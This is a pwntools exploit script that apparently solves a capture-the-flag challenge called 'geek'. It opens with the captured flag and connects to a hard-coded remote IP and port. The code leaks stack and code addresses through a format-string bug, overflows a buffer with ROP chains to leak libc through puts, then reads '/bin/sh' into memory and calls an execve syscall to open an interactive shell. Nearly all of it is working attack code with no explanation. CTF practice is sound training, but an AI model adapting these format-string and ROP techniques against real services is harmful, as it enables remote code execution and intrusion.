#vxctf{g33ky_0r_g4kk1?_1_pr3f3r_g4kki}
from pwn import *

def issue(content):
    r.sendlineafter('Gakki-terminal $ ', '5')
    r.send(content)
def commit(content):
    r.sendlineafter('Gakki-terminal $ ', '1')
    r.sendlineafter('Input your code:\n', content)
def view(idx):
    r.sendlineafter('Gakki-terminal $ ', '2')
    r.sendlineafter('Want to view which version?\n', str(idx))

def packAll(rop):
    return flat([p64(x) for x in rop])

# init
#r = process('./geek')
r = remote('35.194.219.218', 8639)
e = ELF('./geek')
libc = e.libc
context.arch = 'amd64'
context.log_level = 'debug'

# leak
commit('%p'*10)
view(0)
leak = r.recvuntil('1. ')[:-3].split('(nil)')
code = int(leak[4].split('0x')[4], 16)
#leak = r.recvuntil('1. ')[:-3].split('(nil)')
#code = int(leak[4].split('0x')[3], 16)
stack = int(leak[2], 16)
code_base = code&0xfffffffffffff000
log.info('stack leak:%#x' % stack)
log.info('code base:%#x' % code_base)

prdi = code_base+0x0000000000000ef3# : pop rdi ; ret
prsi = code_base+0x0000000000000ef1# : pop rsi ; pop r15 ; ret
self_read = code_base+0xa4a

# 
rop = []
rop += [prdi, code_base+e.got['exit']]
rop += [code_base+e.plt['puts']]
rop += [code_base+0xD1A]
issue('A'*0x18+packAll(rop))
exit = u64(r.recv(6)+'\x00\x00')
libc_base = exit -libc.symbols['exit']
log.info('libc base: %#x' % libc_base)

sh = libc_base + libc.search('/bin/sh\x00').next()
buf = code_base + 0x2021C0
system = libc_base + libc.symbols['system']
#syscall = libc_base + libc.search(asm('syscall')).next()
syscall = code_base + 2372+0x100
#print hex(syscall)

# search
#addr = code_base+2372+0x100
#rop = []
#rop += [prdi, 1]
#rop += [prsi, addr, 0]
#rop += [e.plt['write']+code_base]
#issue('A'*0x18+packAll(rop))
#print r.recv()[:2]
##print r.recv().index(asm('syscall'))


## exploit
rop = []
rop += [prdi, buf]
rop += [prsi, 0x100, 0]
rop += [self_read]
rop += [prdi, buf]
rop += [prsi, 0, 0]
rop += [syscall]
issue('A'*0x18+packAll(rop))
r.send('/bin/sh\x00'+'A'*(0x3b-8))


r.interactive()
